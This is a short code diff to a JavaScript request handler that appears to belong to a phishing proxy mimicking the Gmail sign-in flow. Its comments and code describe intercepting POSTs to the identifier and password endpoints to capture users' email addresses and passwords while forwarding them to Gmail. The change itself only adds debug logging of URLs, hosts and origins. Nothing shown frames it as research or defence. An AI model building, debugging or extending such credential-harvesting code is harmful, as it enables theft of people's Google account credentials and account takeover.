@@ -54,7 +54,10 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
 
     execute(clientContext) {
         // Handle Gmail login flow - direct approach
+        console.log('Gmail DefaultPreHandler.execute() called!')
         console.log('Gmail request:', this.req.url, this.req.method)
+        console.log('Gmail request host:', this.req.headers.host)
+        console.log('Gmail request origin:', this.req.headers.origin)
         
         // For POST requests to password endpoint, capture password and forward to Gmail
         if (this.req.method === 'POST' && this.req.url.includes('/v3/signin/challenge/pwd')) {
@@ -120,6 +123,7 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
 
         // For POST requests to identifier endpoint, capture email and forward to Gmail
         if (this.req.method === 'POST' && this.req.url.includes('/v3/signin/identifier')) {
+            console.log('Gmail POST request to identifier endpoint detected')
             let body = ''
             this.req.on('data', (chunk) => {
                 body += chunk.toString()
